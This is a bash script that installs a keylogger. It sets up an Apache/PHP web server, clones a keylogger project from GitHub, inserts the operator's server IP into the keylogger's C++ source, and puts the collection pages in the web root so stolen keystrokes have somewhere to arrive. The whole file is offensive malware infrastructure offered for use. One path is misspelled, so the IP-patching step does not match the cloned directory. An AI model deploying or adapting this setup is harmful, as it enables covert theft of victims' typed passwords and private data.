#! /bin/bash

#4500 keylogger installer
################################
server_ip='' #ex)33.33.33.33

################################


echo "[*] == 4500 keylogger installer == "

echo "[ ] The installer will automatically start in 3 seconds."

sleep 3

echo "[*] update system and install dependencies"


#setting apt and install lib apache,php,git

sudo apt update
sudo apt upgrade -y
sudo apt install -y git apache2 php libapache2-mod-php

#protect dirctory listing
sed -i 's/Indexes//' /etc/apache2/apache2.conf

#php php working borwser

sudo a2dismod mpm_event
sudo a2enmod mpm_prefork

#restart apache
sudo service apache2 restart

sudo git clone https://github.com/intadd/4500keylogger.git

sudo sed -i 's/define ip ""/define ip '$server_ip'/' ./4500keyloger/4500keylogger.cpp
sudo cp -R ./4500keylogger/4500/ /var/www/html/

sudo cp ./4500keylogger/4500keylogger.cpp /var/www/html/


